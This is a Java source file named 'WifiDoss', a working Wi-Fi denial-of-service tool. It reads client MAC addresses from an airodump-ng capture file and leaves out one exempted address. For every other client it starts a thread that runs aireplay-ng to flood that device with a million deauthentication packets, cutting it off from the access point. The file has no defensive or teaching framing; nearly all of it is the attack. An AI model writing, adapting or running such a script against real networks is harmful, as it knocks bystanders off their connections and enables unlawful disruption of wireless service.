import java.io.*;
import java.lang.*;
import java.util.*;

class WifiDoss
{	static Process proc1;
  public static void main(String args[]) throws IOException
  {
    Scanner scn=new Scanner(System.in);
    int file_count=0;
    String splitBy = ",";
    String clients="",station="",inter="",file_loc,excep_mac="";
    String[] var;
    System.out.println("ENTER THE ACCESS POINT STATION");
    station=scn.next();
    System.out.println("ENTER THE INTERFACE");
    inter=scn.next();
     System.out.println("ENTER THE FILE LOCATION AND NAME");
    file_loc=scn.next();
	System.out.println("EXception Mac");
    excep_mac=scn.next();
	System.out.println("");
	System.out.println("");
	System.out.println("");
    //String filename=file.readLine(); 
			//proc1=Runtime.getRuntime().exec("airodump-ng "+inter+" --write testtest");
			//BufferedReader reader =  new BufferedReader(new InputStreamReader(proc1.getInputStream()));
			//String line1 = "";
			//while((line1 = reader.readLine()) != null) 
			//{
			//System.out.print(line1 + "\n");
			//}
			//try{
			//Thread.sleep(10000);
			//}catch(InterruptedException e){}
			//proc1.destroy();
    
    
    BufferedReader br = new BufferedReader(new FileReader(file_loc));
    String line = br.readLine();
    while ((line = br.readLine())!=null) 
    {
     var = line.split(splitBy);
      if(file_count > 3)
      {
	clients=var[0];
	if(clients.equals(excep_mac))
	{
		System.out.println(clients+"(Exception Mac)");
		System.out.println("");
	}
	else
	{
		
		System.out.println(clients);
		System.out.println("");
		new NewThread(station,clients,inter,file_count);	
	}
	
      }
      file_count=file_count+1;
    }
    
    
    try{
      Thread.sleep(9000);}
    catch(InterruptedException e){}
    //System.out.println("going to next");
  }
}


class NewThread implements Runnable
{ Thread t;
  String station,clients,inter;
   String file_count1; 
    Process proc;
  NewThread(String station,String clients,String inter,int file_count)
  {
    file_count1=""+file_count;
    this.station=station;
    this.clients=clients;
    this.inter=inter;
    t=new Thread(this,file_count1);
    t.start();
  }
  public void run()
  {	
    try{
    proc=Runtime.getRuntime().exec("aireplay-ng -0 1000000 -a "+station+" -c "+clients+" "+inter);
    try{
    
    t.sleep(1000);
    }
    catch(InterruptedException ee){}
      BufferedReader reader =  new BufferedReader(new InputStreamReader(proc.getInputStream()));
		String line1 = "";
			while((line1 = reader.readLine()) != null) 
			{
			System.out.print(line1 + "\n");
			}
}
    catch(IOException eee)
    {
	
    }
  
    
  }
}  
    
